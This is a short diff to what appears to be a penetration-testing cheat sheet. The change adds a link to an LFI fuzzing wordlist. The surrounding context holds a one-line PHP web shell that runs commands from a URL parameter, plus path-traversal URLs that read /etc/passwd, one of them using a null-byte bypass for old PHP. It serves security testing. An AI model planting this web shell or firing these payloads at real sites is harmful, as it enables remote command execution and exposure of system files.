@@ -160,7 +160,8 @@ Bypass header check:
     <?php system($_GET["cmd"]); ?>
 
 ### LFI Testing 
-Check for client side scripts 
+Check for client side scripts     
+Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) to fuzz.    
 
     http://example.com/index.php?page=../../../etc/passwd  
     http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
